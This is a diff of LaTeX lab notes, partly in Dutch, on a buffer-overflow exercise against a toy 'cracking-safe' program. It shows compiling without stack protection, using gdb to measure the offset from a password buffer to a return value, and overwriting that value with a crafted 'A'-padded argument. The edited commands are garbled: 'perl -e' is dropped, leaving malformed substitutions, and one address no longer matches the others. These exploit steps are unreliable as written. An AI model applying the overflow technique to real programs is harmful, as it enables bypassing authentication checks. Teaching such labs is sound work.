@@ -1,5 +1,5 @@
 \begin{enumerate}
-  \item gcc -g -fno-stack-protector -z execstack -o cracking-safe cracking-safe.c
+  \item gcc-3.3 -o cracking-safe cracking-safe.c
   \item gdb -q cracking-safe
   \item (gdb) list
   	\begin{enumerate}
@@ -26,25 +26,25 @@
   \item (gdb) run azer
   		\item (gdb) x/x \&return\_value
   			\begin{enumerate}
-  			\item 0xbffff65c
+  			\item 0xbffff714
   			\end{enumerate}
   		\item (gdb) x/x password
   			\begin{enumerate}
-  			\item 0xbffff654
+  			\item 0xbffff708
   			\end{enumerate}
-  	\item (gdb) print 0xbffff65c - 0xbffff654
+  	\item (gdb) print 0xbffff714 - 0xbffff708
   		\begin{enumerate}
-  		\item \$1 = 8
+  		\item \$1 = 12
   		\end{enumerate}
-  	\item (gdb) run ``azertyuip''
+  	\item (gdb) run ``\$(`print ``A''x12 . ``B'' ')''
   	\item (gdb) cont
   	\item (gdb) x/x \&return\_value
   		\begin{enumerate}
-  		\item 0xbffff64c: 0x00000070
+  		\item 0xbffff64c: 0x00000042
   		\item return\_value is overschreven en zal geen 0 meer teruggeven.
   		\end{enumerate}
   	\item (gdb) quit
-  	\item ./cracking-safe ``\$(perl -e `print ``A''x8 . ``B'' ')''
+  	\item ./cracking-safe ``\$(`print ``A''x12 . ``B'' ')''
 \end{enumerate}
 
 \begin{lstlisting}
